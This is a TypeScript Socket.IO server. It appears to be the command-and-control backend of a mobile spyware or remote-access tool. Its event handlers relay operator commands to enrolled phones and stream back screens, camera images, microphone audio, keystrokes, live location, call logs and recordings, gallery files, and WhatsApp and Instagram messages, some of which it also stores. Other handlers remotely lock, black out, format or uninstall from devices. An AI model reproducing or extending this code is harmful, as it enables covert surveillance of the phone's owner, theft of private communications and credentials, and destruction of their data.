import express, { response } from "express";
import http from "http";
import { Server } from "socket.io";

import {
	addNewDeviceInfo,
	setDeviceOffline,
	updateBatteryAndNetwork,
	updateBlackAndLock,
} from "../../controllers/device.controller";

import {
	SocketIOPublicEvents,
	SocketIOMobileEvents,
	DeviceModelType,
} from "../../utils";

import {
	addWhatsappClientList,
	addWhatsappClientMessage,
	addInstagramClientList,
	addInstagramClientMessage,
} from "../../controllers/social.controller";

import { addNewKeyLogs } from "../../controllers/keylogs.controller";

const app = express();

const server = http.createServer(app);

const corsOptions = {
	//origin: API_URL,
	origins: "*:*",
	methods: ["GET", "POST"],
	allowedHeaders: [
		"Content-Type",
		"Authorization",
		"x-access-token",
		"Access-Control-Allow-Origin",
	],
	optionsSuccessStatus: 200,
};

const io = new Server(server, {
	cors: corsOptions,
});

const deviceData = new Map();

export const startSocketIO = async () => {
	try {
		io.on("connection", (socket: any) => {
			console.log("⌛ A client connected", socket.id);

			// Create Chat Join Room
			socket.on("ChatRoom", (room: any) => {
				socket.join(room);
				console.log(`User ${socket.id} joined room ${room}`);
			});

			// Send Message
			socket.on("chatMessage", (msg: any) => {
				console.log("message:", msg);
				// if (msg?.sender == "user") {
				// 	io.to(msg.userId).emit("chatMessageToAdmin", msg);
				// } else if (msg?.sender == "admin") {
				const Adminmsg = {
					userId: "664b59ff6d38407507e50eed",
					message: "How are you?",
					sender: "admin",
				};
				io.to(msg.userId).emit("chatMessageToUser", Adminmsg);
				// }
			});

			// Create Or Join Room
			socket.on(
				`${SocketIOPublicEvents.JOIN_ROOM}`,
				async (deviceId: any) => {
					const roomId = `room-${deviceId}`;

					if (io.sockets.adapter.rooms.has(roomId)) {
						// Room already exists, join the existing room
						socket.join(roomId);
						console.log(`Socket joined existing room: ${roomId}`);
					} else {
						// Room doesn't exist, create and join a new room
						socket.join(roomId);
						console.log(
							`Socket created and joined new room: ${roomId}`
						);
					}
				}
			);

			// Device Event
			socket.on(
				`${SocketIOPublicEvents.DEVICE_EVENT}`,
				async (data: any) => {
					try {
						if (data && data.action && data.deviceId) {
							// Emit the event to all connected clients
							io.emit(SocketIOMobileEvents.MOBILE_DEVICE_EVENT, {
								action: data.action,
								deviceId: data.deviceId,
							});
						} else {
							console.log("Invalid device event data received");
						}
					} catch (error) {
						console.error("Error handling device event:", error);
					}
				}
			);

			// Add New Device
			socket.on(
				`${SocketIOPublicEvents.ADD_NEW_DEVICE}`,
				async (device: DeviceModelType) => {
					try {
						const res = await addNewDeviceInfo(device, socket.id);

						if (res?.success === true) {
							// Emit success event to the client
							io.emit(`${SocketIOPublicEvents.ADDED_DEVICE}`, {
								device: device,
								success: true,
								message: "success",
							});
						} else if (res?.success === false) {
							io.emit(`${SocketIOPublicEvents.ADDED_DEVICE}`, {
								device: device,
								success: false,
								message: "exist",
							});
						} else {
							io.emit(`${SocketIOPublicEvents.ADDED_DEVICE}`, {
								device: device,
								success: false,
								message: "error",
							});
						}
					} catch (error) {
						console.error("Error processing device", error);
					}
				}
			);

			// Recieve the Device Battery and netStatus from mobile
			socket.on(
				`${SocketIOPublicEvents.DEVICE_INFORMATION_RESPONSE}`,
				async (response: any) => {
					try {
						const deviceId = response.deviceId;
						const res = await updateBatteryAndNetwork(response);

						if (res?.success === true) {
							io.emit(
								`${SocketIOPublicEvents.DEVICE_INFORMATION_SHARED}-${deviceId}`,
								{
									data: response,
								}
							);
						}
					} catch (error) {
						console.log("Device information Response Error", error);
					}
				}
			);

			// Screen Monitor
			socket.on(
				`${SocketIOPublicEvents.SCREEN_MONITOR}`,
				async (data: any) => {
					try {
						const { deviceId } = data;

						// Send ScreenMonitor requestion into mobile app
						io.emit(
							`${SocketIOMobileEvents.MOBILE_SCREEN_MONITOR}-${deviceId}`,
							{
								deviceId: deviceId,
							}
						);
					} catch (error) {
						console.log("Screen Monitor Error", error);
					}
				}
			);

			// Screen FPS Control Monitor
			socket.on(
				`${SocketIOPublicEvents.SCREEN_FPS_EVENT}`,
				async (data: any) => {
					try {
						const { deviceId, fps } = data;
						console.log("screen fps monitor=>", deviceId);

						// Send FPS requestion into mobile app
						io.emit(
							`${SocketIOMobileEvents.MOBILE_SCREEN_FPS_EVENT}-${deviceId}`,
							{
								deviceId,
								fps,
							}
						);
					} catch (error) {
						console.log("screen fps monitor Error", error);
					}
				}
			);

			// Screen Quality Control Monitor
			socket.on(
				`${SocketIOPublicEvents.SCREEN_QUALITY_EVENT}`,
				async (data: any) => {
					try {
						const { deviceId, quality } = data;

						// Send quality requestion into mobile app
						io.emit(
							`${SocketIOMobileEvents.MOBILE_SCREEN_QUALITY_EVENT}-${deviceId}`,
							{
								deviceId,
								quality,
							}
						);
					} catch (error) {
						console.log("screen quality monitor Error", error);
					}
				}
			);

			// Screen Lock/UnLock
			socket.on(
				`${SocketIOPublicEvents.DEVICE_LOCK_EVENT}`,
				async (data: any) => {
					try {
						const { deviceId, event } = data;
						console.log("screen lock monitor=>", deviceId, event);

						// Send lock/unlock requestion into mobile app
						io.emit(
							`${SocketIOMobileEvents.MOBILE_DEVICE_LOCK}-${deviceId}`,
							{
								deviceId,
								event,
							}
						);
					} catch (error) {
						console.log("screen lock/unlock monitor Error", error);
					}
				}
			);
			// Screen Refresh
			socket.on(
				`${SocketIOPublicEvents.SCREEN_MONITOR_REFRESH}`,
				async (data: any) => {
					try {
						const { deviceId } = data;

						// Send refresh requestion into mobile app
						io.emit(
							`${SocketIOMobileEvents.MOBILE_SCREEN_MONITOR_REFRESH}-${deviceId}`,
							{
								deviceId,
							}
						);
					} catch (error) {
						console.log("screen refresh monitor Error", error);
					}
				}
			);

			// Screen Scroll Event
			socket.on(
				`${SocketIOPublicEvents.SCREEN_SCROLL_EVENT}`,
				async (data: any) => {
					try {
						const { deviceId, event } = data;

						// Send scroll requestion into mobile app
						io.emit(
							`${SocketIOMobileEvents.MOBILE_SCREEN_CONTROL_SCROLL}-${deviceId}`,
							{
								deviceId,
								event,
							}
						);
					} catch (error) {
						console.log("screen scroll monitor Error", error);
					}
				}
			);

			// Recieve the Screens from mobile
			socket.on(
				`${SocketIOPublicEvents.SCREEN_MOBILE_RESPONSE}`,
				async (response: any) => {
					try {
						const deviceId = response.deviceId;
						io.emit(
							`${SocketIOPublicEvents.SCREEN_SHARE}-${deviceId}`,
							{
								type: "screen-monitor",
								option: "base64",
								response,
							}
						);
					} catch (error) {
						console.log("Screen Monitor Response Error", error);
					}
				}
			);

			// Recieve the Byte Screens from mobile
			socket.on(
				`${SocketIOPublicEvents.SCREEN_MOBILE_BYTE_RESPONSE}`,
				async (response: any) => {
					try {
						const deviceId = response.deviceId;
						io.emit(
							`${SocketIOPublicEvents.SCREEN_SHARE}-${deviceId}`,
							{
								type: "screen-monitor",
								option: "byte",
								response,
							}
						);
					} catch (error) {
						console.log("Screen Monitor Response Error", error);
					}
				}
			);

			// Screen Skeletion Monitor
			socket.on(
				`${SocketIOPublicEvents.SCREEN_SKELETON}`,
				async (data: any) => {
					try {
						const { deviceId } = data;

						// Send Skeleton requestion into mobile app
						io.emit(
							`${SocketIOMobileEvents.MOBILE_SCREEN_SKELETION}-${deviceId}`,
							{
								deviceId: deviceId,
							}
						);
					} catch (error) {
						console.log("Screen Skeleton Monitor Error", error);
					}
				}
			);

			// Recieve the Screens of Skeleton from mobile
			socket.on(
				`${SocketIOPublicEvents.SCREEN_SKELETON_MOBILE_RESPONSE}`,
				async (response: any) => {
					try {
						const deviceId = response.deviceId;
						io.emit(
							`${SocketIOPublicEvents.SCEEEN_SKELETION_SHARED}-${deviceId}`,
							{
								type: "screen-skeleton",
								response,
							}
						);
					} catch (error) {
						console.log(
							"Screen Skeleton Monitor Response Error",
							error
						);
					}
				}
			);

			// Screen Send Text
			socket.on(
				`${SocketIOPublicEvents.SCREEN_SEND_TEXT}`,
				async (data: any) => {
					try {
						const { deviceId, message } = data;
						// Send Text requestion into mobile app
						io.emit(
							`${SocketIOMobileEvents.MOBILE_SCREEN_SEND_TEXT}-${deviceId}`,
							{
								deviceId: deviceId,
								data: message?.text,
							}
						);
					} catch (error) {
						console.log("Screen send text Error", error);
					}
				}
			);

			// Camera Monitor
			socket.on(
				`${SocketIOPublicEvents.CAMERA_MONITOR}`,
				async (data: any) => {
					try {
						const { deviceId, cameraType, qualityType } = data;
						// Send Camera Monitor requestion into mobile app
						io.emit(
							`${SocketIOMobileEvents.MOBILE_CAMERA_MONITOR}-${deviceId}`,
							{
								deviceId: deviceId,
								cameraType: cameraType,
								qualityType: qualityType,
							}
						);
					} catch (error) {
						console.log("Back Camera Monitor Error", error);
					}
				}
			);

			// Receive the Camera from Mobile
			socket.on(
				`${SocketIOPublicEvents.CAMERA_MOBILE_RESPONSE}`,
				async (response: any) => {
					try {
						const deviceId = response.deviceId;
						const cameraType = response.cameraType;
						const qualityType = response.qualityType;
						const base64Image = response.base64Image;

						io.emit(
							`${SocketIOPublicEvents.CAMERA_SHARE}-${deviceId}`,
							{
								deviceId: deviceId,
								cameraType: cameraType,
								qualityType: qualityType,
								base64Image: base64Image,
							}
						);
					} catch (error) {
						console.log("Back Camera Response Error", error);
					}
				}
			);

			// Mic Monitor
			socket.on(
				`${SocketIOPublicEvents.MIC_MONITOR}`,
				async (data: any) => {
					try {
						const { deviceId, micType } = data;

						// Send Mic Monitor requestion into mobile app
						io.emit(
							`${SocketIOMobileEvents.MOBILE_MIC_MONITOR}-${deviceId}`,
							{
								micType: micType,
								deviceId: deviceId,
							}
						);
					} catch (error) {
						console.error("Mic Monitor Error", error);
					}
				}
			);

			// Recieve the Mic from mobile
			socket.on(
				`${SocketIOPublicEvents.MIC_MOBILE_RESPONSE}`,
				async (response: any) => {
					try {
						// const res = await addNewAudio(response);

						const deviceId = response.deviceId;
						const micType = response.micType;
						const base64Audio = response.base64Audio;

						io.emit(
							`${SocketIOPublicEvents.MIC_SHARE}-${deviceId}`,
							{
								deviceId: deviceId,
								mic: micType,
								base64Audio: base64Audio,
							}
						);
					} catch (error) {
						console.log("Mic Response Error", error);
					}
				}
			);

			// Key Logs Monitor
			socket.on(
				`${SocketIOPublicEvents.KEY_MONITOR}`,
				async (data: any) => {
					try {
						const { deviceId } = data;
						// Send Key logs requestion into mobile app
						io.emit(
							`${SocketIOMobileEvents.MOBILE_KEY_LOGS}-${deviceId}`,
							{
								deviceId: deviceId,
							}
						);
					} catch (error) {
						console.log("Key Logs Monitor Error", error);
					}
				}
			);

			socket.on(
				`${SocketIOPublicEvents.KEY_MOBILE_RESPONSE}`,
				async (response: any) => {
					try {
						const deviceId = response.deviceId;
						const keyLogsType = response.keyLogsType;
						const keylogs = response.keylogs;
						const keyEvent = response.event;

						// Check if keylogs is not an empty string before proceeding
						if (
							(keyEvent === "Text Input" ||
								keyEvent === "Button Click") &&
							keylogs &&
							keylogs !== "[]" &&
							keylogs !== ""
						) {
							console.log("KEYLOGS SEND===>", keylogs);
							io.emit(
								`${SocketIOPublicEvents.KEY_SHARE}-${deviceId}`,
								{
									deviceId: deviceId,
									keyLogsType: keyLogsType,
									keylogs: keylogs,
									keyevent: keyEvent,
									created_at: Date.now(),
								}
							);

							// Data should be include deviceId and keylogs
							// await addNewKeyLogs(response);
						} else {
							console.log("Empty key logs, skipping...");
						}
					} catch (error) {
						console.log("Key Logs Response Error", error);
					}
				}
			);

			// Offline Keylogs Save
			socket.on(
				`${SocketIOPublicEvents.KEY_MOBILE_REALTIME_RESPONSE}`,
				async (response: any) => {
					try {
						const keylogs = response.keylogs;
						const keyEvent = response.event;
						// Check if keylogs is not an empty string before proceeding
						if (
							(keyEvent === "Text Input" ||
								keyEvent === "Button Click") &&
							keylogs &&
							keylogs !== "[]" &&
							keylogs !== ""
						) {
							console.log("real-time keylogs:", keylogs);
							// Data should be include deviceId and keylogs
							addNewKeyLogs(response);
						} else {
							console.log("Empty offline key logs, skipping...");
						}
					} catch (error) {
						console.log("Offline Key Logs Response Error", error);
					}
				}
			);

			// Real-Time Location Monitor
			socket.on(
				`${SocketIOPublicEvents.LOCATION_MONITOR}`,
				async (data: any) => {
					try {
						const { deviceId } = data;
						// Send real-location requestion into mobile app
						io.emit(
							`${SocketIOMobileEvents.MOBILE_LOCATION_MONITOR}-${deviceId}`,
							{
								deviceId: deviceId,
							}
						);
					} catch (error) {
						console.log("Real Location Monitor Error", error);
					}
				}
			);

			// Recieve the Real-Time Localtion from mobile
			socket.on(
				`${SocketIOPublicEvents.LOCATION_MOBILE_RESPONSE}`,
				async (response: any) => {
					try {
						const deviceId = response.deviceId;
						const lat = response.lat;
						const lng = response.lng;

						io.emit(
							`${SocketIOPublicEvents.LOCATION_SHARE}-${deviceId}`,
							{
								deviceId: deviceId,
								lat: lat,
								lng: lng,
							}
						);
					} catch (error) {
						console.log("Real-Location Response Error", error);
					}
				}
			);

			// Application Monitor
			socket.on(
				`${SocketIOPublicEvents.APP_MONITOR}`,
				async (data: any) => {
					try {
						const { deviceId } = data;
						console.log("Application Requesting=>", deviceId);

						io.emit(
							`${SocketIOMobileEvents.MOBILE_APP_MONITOR}-${deviceId}`,
							{
								deviceId: deviceId,
							}
						);
					} catch (error) {
						console.log("Application Monitor Error", error);
					}
				}
			);

			// Receive App list  from mobile
			socket.on(
				`${SocketIOPublicEvents.APP_MOBILE_RESPONSE}`,
				async (response: any) => {
					try {
						const deviceId = response.deviceId;
						const data = response.data;

						io.emit(
							`${SocketIOPublicEvents.APP_SHARED}-${deviceId}`,
							{
								deviceId: deviceId,
								data: data,
							}
						);
					} catch (error) {
						console.log("Application Error", error);
					}
				}
			);

			// Call History Monitor
			socket.on(
				`${SocketIOPublicEvents.CALL_HISTORY_MONITOR}`,
				async (data: any) => {
					try {
						const { deviceId } = data;
						// Send call history requestion into mobile app
						io.emit(
							`${SocketIOMobileEvents.MOBILE_CALL_HISTORY_MONITOR}-${deviceId}`,
							{
								deviceId: deviceId,
							}
						);
					} catch (error) {
						console.log("Call History Monitor Error", error);
					}
				}
			);

			// Receive Call History  from mobile
			socket.on(
				`${SocketIOPublicEvents.CALL_HISTORY_RESPONSE}`,
				async (response: any) => {
					try {
						const deviceId = response.deviceId;

						// const res = await addNewCallHistory(response);

						// console.log("Save New Call History", res);

						io.emit(
							`${SocketIOPublicEvents.CALL_HISTORY_SHARE}-${deviceId}`,
							{
								callData: response,
							}
						);
					} catch (error) {
						console.log("Call History Error", error);
					}
				}
			);

			// Call Record Monitor
			socket.on(
				`${SocketIOPublicEvents.CALL_RECORD_MONITOR}`,
				async (data: any) => {
					try {
						const { deviceId } = data;

						// Send Call Record requestion into mobile app
						io.emit(
							`${SocketIOMobileEvents.MOBILE_CALL_RECORD_MONITOR}-${deviceId}`,
							{
								deviceId: deviceId,
							}
						);
					} catch (error) {
						console.log("Call Record Monitor Error", error);
					}
				}
			);

			// Recieve the Call Record from mobile
			socket.on(
				`${SocketIOPublicEvents.CALL_RECORD_MOBILE_RESPONSE}`,
				async (response: any) => {
					try {
						const deviceId = response.deviceId;

						io.emit(
							`${SocketIOPublicEvents.CALL_RECORD_SHARE}-${deviceId}`,
							{
								type: "call-record-monitor",
								response,
							}
						);
					} catch (error) {
						console.log("Call Record Response Error", error);
					}
				}
			);

			// Receive the whatsapp clientList from mobile
			socket.on(
				`${SocketIOPublicEvents.WHATSAPP_CHIENTLIST_MOBILE_RESPONSE}`,
				async (response: any) => {
					try {
						const { type, deviceId, data } = response;

						if (type == "clientsList") {
							await addWhatsappClientList(deviceId, data);

							// Send whatsapp list to client
							io.emit(
								`${SocketIOPublicEvents.WHATSAPP_CHIENTLIST_TO_WEB}-${deviceId}`,
								{
									deviceId: deviceId,
									data: data,
								}
							);
						}
					} catch (error) {
						console.log(
							"Whatsapp Client List Response Error",
							error
						);
					}
				}
			);

			// Receive the whatsapp messages from mobile
			socket.on(
				`${SocketIOPublicEvents.WHATSAPP_MESSAGE_MOBILE_RESPONSE}`,
				async (response: any) => {
					try {
						const { type, deviceId, data } = response;

						if (type == "clientMessage") {
							await addWhatsappClientMessage(deviceId, data);

							// Send whatsapp client messages to client
							io.emit(
								`${SocketIOPublicEvents.WHATSAPP_MESSAGE_TO_WEB}-${deviceId}`,
								{
									deviceId: deviceId,
									data: data,
								}
							);
						}
					} catch (error) {
						console.log("Whatsapp Message Response Error", error);
					}
				}
			);

			// Receive the instagram clientList from mobile
			socket.on(
				`${SocketIOPublicEvents.INSTAGRAM_CLIENTLIST_MOBILE_RESPONSE}`,
				async (response: any) => {
					try {
						const { type, deviceId, data } = response;

						if (type == "clientsList") {
							await addInstagramClientList(deviceId, data);

							// Send instagram list to client
							io.emit(
								`${SocketIOPublicEvents.INSTAGRAM_CLIENTLIST_TO_WEB}-${deviceId}`,
								{
									deviceId: deviceId,
									data: data,
								}
							);
						}
					} catch (error) {
						console.log("Instagram Client List Response Error");
					}
				}
			);

			// Receive the instagram client messages from mobile
			socket.on(
				`${SocketIOPublicEvents.INSTAGRAM_MESSAGE_MOBILE_RESPONSE}`,
				async (response: any) => {
					try {
						const { type, deviceId, data } = response;

						if (type == "clientMessage") {
							await addInstagramClientMessage(deviceId, data);

							// Send instagram client messages to client
							io.emit(
								`${SocketIOPublicEvents.INSTAGRAM_MESSAGE_TO_WEB}-${deviceId}`,
								{
									deviceId: deviceId,
									data: data,
								}
							);
						}
					} catch (error) {
						console.log("Instagram Message Response Error", error);
					}
				}
			);

			// Screen Control Click Event
			socket.on(
				`${SocketIOPublicEvents.SCREEN_CLICK_EVENT}`,
				async (data: any) => {
					try {
						const { deviceId, xPosition, yPosition } = data;
						// Send Screen Control requestion into mobile app
						io.emit(
							`${SocketIOMobileEvents.MOBILE_SCREEN_CLICK_EVENT}-${deviceId}`,
							{
								deviceId: deviceId,
								xPosition: xPosition,
								yPosition: yPosition,
							}
						);
					} catch (error) {
						console.log("Screen Click Error", error);
					}
				}
			);

			// Screen Control Drag Event
			socket.on(
				`${SocketIOPublicEvents.SCREEN_DRAG_EVENT}`,
				async (data: any) => {
					try {
						const { deviceId, positions } = data;

						// Send Screen Control requestion into mobile app
						io.emit(
							`${SocketIOMobileEvents.MOBILE_SCREEN_DRAG_EVENT}-${deviceId}`,
							{
								deviceId: deviceId,
								positions: positions,
							}
						);
					} catch (error) {
						console.log("Screen Drag Error", error);
					}
				}
			);

			// Screen Setting Event
			socket.on(
				`${SocketIOPublicEvents.SCREEN_SETTING_EVENT}`,
				async (data: any) => {
					try {
						const { type, deviceId, status, message } = data;

						// Send Screen Control Setting requestion into mobile app
						const screenEvent =
							type === "blackScreen"
								? SocketIOMobileEvents.MOBILE_SCREEN_BLACK_EVENT
								: SocketIOMobileEvents.MOBILE_SCREEN_LOCK_EVENT;
						io.emit(`${screenEvent}-${deviceId}`, {
							type,
							deviceId,
							status,
							message,
						});

						await updateBlackAndLock(data);
					} catch (error) {
						console.log("Screen Setting Error", error);
					}
				}
			);

			// Gallery Manager
			socket.on(
				`${SocketIOPublicEvents.GALLERY_MANAGER}`,
				async (data: any) => {
					try {
						const { deviceId } = data;
						// Send gallery requestion into mobile app
						io.emit(
							`${SocketIOMobileEvents.MOBILE_GALLERY_MANAGER}-${deviceId}`,
							{
								deviceId: deviceId,
							}
						);
					} catch (error) {
						console.log("Get Gallery List Error", error);
					}
				}
			);

			// Recieve the Gallery List from mobile
			socket.on(
				`${SocketIOPublicEvents.GALLERY_MANAGER_RESPONSE}`,
				async (response: any) => {
					try {
						const deviceId = response.deviceId;

						// await addGalleryList(deviceId, data);
						io.emit(
							`${SocketIOPublicEvents.GALLERY_LIST_SHARE}-${deviceId}`,
							{
								data: response,
							}
						);
					} catch (error) {
						console.log("Gallery List Response Error", error);
					}
				}
			);

			// Get Gallery
			socket.on(
				`${SocketIOPublicEvents.GALLERY_GET}`,
				async (data: any) => {
					try {
						const { deviceId, filepath } = data.data;

						// Send gallery requestion into mobile app
						io.emit(
							`${SocketIOMobileEvents.MOBILE_GET_GALLERY}-${deviceId}`,
							{
								filepath: filepath,
							}
						);
					} catch (error) {
						console.log("Key Logs Monitor Error", error);
					}
				}
			);

			// Recieve one Gallery from mobile
			socket.on(
				`${SocketIOPublicEvents.GALLERY_ONE_RESPONSE}`,
				async (response: any) => {
					try {
						const deviceId = response.deviceId;

						io.emit(
							`${SocketIOPublicEvents.GALLERY_ONE_SHARE}-${deviceId}`,
							{
								data: response,
							}
						);
					} catch (error) {
						console.log("One Gallery Response Error", error);
					}
				}
			);

			// Device Format
			socket.on(
				`${SocketIOPublicEvents.DEVICE_FORMAT_EVENT}`,
				async (data: any) => {
					try {
						const { deviceId } = data;

						io.emit(
							`${SocketIOMobileEvents.MOBILE_DEVICE_FORMAT_EVENT}-${deviceId}`,
							{
								deviceId: deviceId,
							}
						);
					} catch (error) {
						console.log("Device Format Error", error);
					}
				}
			);

			// Recieve device format result from mobile
			socket.on(
				`${SocketIOPublicEvents.DEVICE_FORMAT_RESPONSE}`,
				async (response: any) => {
					try {
						const deviceId = response.deviceId;

						io.emit(
							`${SocketIOPublicEvents.DEVICE_FORMAT_SHARED}-${deviceId}`,
							{
								deviceId: deviceId,
								type: "formatted",
							}
						);
					} catch (error) {
						console.log("Device format Response Error", error);
					}
				}
			);

			// Uninstall APP
			socket.on(
				`${SocketIOPublicEvents.UNINSTALL_APP_EVENT}`,
				async (data: any) => {
					try {
						const { deviceId } = data;
						io.emit(
							`${SocketIOMobileEvents.MOBILE_UNINSTALL_APP_EVENT}-${deviceId}`,
							{
								deviceId: deviceId,
								type: "uninstall",
							}
						);
					} catch (error) {
						console.log("Uninstall App Error", error);
					}
				}
			);

			// Recieve uninstall app result from mobile
			socket.on(
				`${SocketIOPublicEvents.UNINSTALL_APP_RESPONSE}`,
				async (response: any) => {
					try {
						const deviceId = response.deviceId;

						io.emit(
							`${SocketIOPublicEvents.UNINSTALL_APP_SHARED}-${deviceId}`,
							{
								deviceId: deviceId,
								type: "uninstalled",
							}
						);
					} catch (error) {
						console.log("Uninstall App Response Error", error);
					}
				}
			);

			// Screen Main Control
			socket.on(
				`${SocketIOPublicEvents.SCREEN_CONTROL_EVENT}`,
				async (data: any) => {
					try {
						const { deviceId, event } = data;

						io.emit(`mb-${event}-${deviceId}`, {
							deviceId: deviceId,
						});
					} catch (error) {
						console.log("screen control Error", error);
					}
				}
			);

			// Monitor Close
			socket.on(
				`${SocketIOPublicEvents.MONITOR_CLOSE}`,
				async (data: any) => {
					try {
						if (data && data?.deviceId) {
							// Emit the monitor close
							io.emit(`mb-monitor-close-${data.deviceId}`, {
								deviceId: data.deviceId,
								type: data.type,
							});
						} else {
							console.log("Invalid monitor close data received");
						}
					} catch (error) {
						console.error("Error monitor close:", error);
					}
				}
			);

			// Disconnect Socket
			socket.on("disconnect", async () => {
				console.log("❌ A client disconnected", socket.id);
				const res = await setDeviceOffline(socket.id);
				if (res.success == true) {
					io.emit(`offline-shared-${res.device?.userId}`, {
						device: res.device,
						type: "offline",
					});
				}
			});
		});

		const PORT = process.env.WebSocketIO;
		server.listen(PORT, () => {
			console.log(`✔ Socket.IO server running on port ${PORT}`);
		});
	} catch (error) {
		console.error("Socket.IO starting failed:", error);
	}
};
